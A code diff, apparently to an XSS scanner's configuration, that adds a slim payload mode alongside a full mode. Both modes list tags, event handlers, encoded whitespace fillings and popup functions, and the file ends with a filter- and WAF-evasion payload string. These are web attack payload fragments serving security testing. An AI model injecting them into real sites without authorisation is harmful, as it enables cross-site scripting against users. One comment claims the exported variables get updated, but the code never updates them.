@@ -25,26 +25,99 @@ specialAttributes = ['srcdoc', 'src']
 badTags = ('iframe', 'title', 'textarea', 'noembed',
            'style', 'template', 'noscript')
 
-tags = ('html', 'd3v', 'a', 'details')  # HTML Tags
+# ==================== Payload 配置模式 ====================
+# 提供两种模式：精简模式（~100个payload）和完整模式
 
-# "Things" that can be used between js functions and breakers e.g. '};alert()//
-jFillings = (';')
-# "Things" that can be used before > e.g. <tag attr=value%0dx>
-lFillings = ('', '%0dx')
-# "Things" to use between event handler and = or between function and =
-eFillings = ('%09', '%0a', '%0d',  '+')
-fillings = ('%09', '%0a', '%0d', '/+/')  # "Things" to use instead of space
-
-eventHandlers = {  # Event handlers and the tags compatible with them
-    'ontoggle': ['details'],
-    'onpointerenter': ['d3v', 'details', 'html', 'a'],
-    'onmouseover': ['a', 'html', 'd3v']
+# 精简模式配置（默认）- 约100个payload，专注于最有效的攻击向量
+slim_config = {
+    'tags': ('img', 'svg', 'body', 'script'),
+    'jFillings': (';'),
+    'lFillings': ('',),
+    'eFillings': ('%09', ' '),
+    'fillings': ('%09', ' '),
+    'eventHandlers': {
+        'onerror': ['img', 'body'],
+        'onload': ['svg', 'body'],
+        'direct': ['script']
+    },
+    'functions': (
+        'alert(1)',
+        'confirm()',
+        'prompt()'
+    )
 }
 
-functions = (  # JavaScript functions to get a popup
-    '[8].find(confirm)', 'confirm()',
-    '(confirm)()', 'co\u006efir\u006d()',
-    '(prompt)``', 'a=prompt,a()')
+# 完整模式配置 - 覆盖更多变体和绕过技巧
+full_config = {
+    'tags': ('html', 'd3v', 'a', 'details'),
+    'jFillings': (';'),
+    'lFillings': ('', '%0dx'),
+    'eFillings': ('%09', '%0a', '%0d', '+'),
+    'fillings': ('%09', '%0a', '%0d', '/+/'),
+    'eventHandlers': {
+        'ontoggle': ['details'],
+        'onpointerenter': ['d3v', 'details', 'html', 'a'],
+        'onmouseover': ['a', 'html', 'd3v']
+    },
+    'functions': (
+        '[8].find(confirm)', 'confirm()',
+        '(confirm)()', 'co\u006efir\u006d()',
+        '(prompt)``', 'a=prompt,a()'
+    )
+}
+
+# 默认使用精简模式
+_useSlimPayloads = True
+
+# 获取当前激活的payload配置
+def getPayloadConfig():
+    """获取当前激活的payload配置字典"""
+    return slim_config if _useSlimPayloads else full_config
+
+def applyPayloadConfig(use_slim=True):
+    """
+    应用payload配置，切换精简模式或完整模式
+    
+    Args:
+        use_slim: True=精简模式（~100个payload），False=完整模式
+    
+    Returns:
+        预计payload数量（实际数量可能略有不同，因为会根据上下文过滤）
+    """
+    global _useSlimPayloads
+    _useSlimPayloads = use_slim
+    
+    config = getPayloadConfig()
+    
+    # 更精确的预计payload数量计算
+    # 考虑到 eventHandler 与 tag 的映射关系
+    total = 0
+    for tag in config['tags']:
+        for eventHandler in config['eventHandlers']:
+            if tag in config['eventHandlers'][eventHandler]:
+                # script 标签的 direct 事件：虽然用了 continue，但仍会遍历所有 filling/eFilling/lFilling 组合
+                if tag == 'script' and eventHandler == 'direct':
+                    # <script>function</script> 格式
+                    # 实际生成：functions × fillings × eFillings × lFillings × ends
+                    # (continue 只跳过当前 end，但会遍历所有外层循环组合)
+                    total += len(config['functions']) * len(config['fillings']) * \
+                            len(config['eFillings']) * len(config['lFillings']) * 2
+                else:
+                    # 其他标签：functions × fillings × eFillings × lFillings × ends
+                    total += len(config['functions']) * len(config['fillings']) * \
+                            len(config['eFillings']) * len(config['lFillings']) * 2
+    
+    return total
+
+# 导出的配置变量（向后兼容，初始值）
+# 注意：这些会在 applyPayloadConfig 调用后被更新
+tags = slim_config['tags']
+jFillings = slim_config['jFillings']
+lFillings = slim_config['lFillings']
+eFillings = slim_config['eFillings']
+fillings = slim_config['fillings']
+eventHandlers = slim_config['eventHandlers']
+functions = slim_config['functions']
 
 payloads = (  # Payloads for filter & WAF evasion
     '\'"</Script><Html Onmouseover=(confirm)()//'
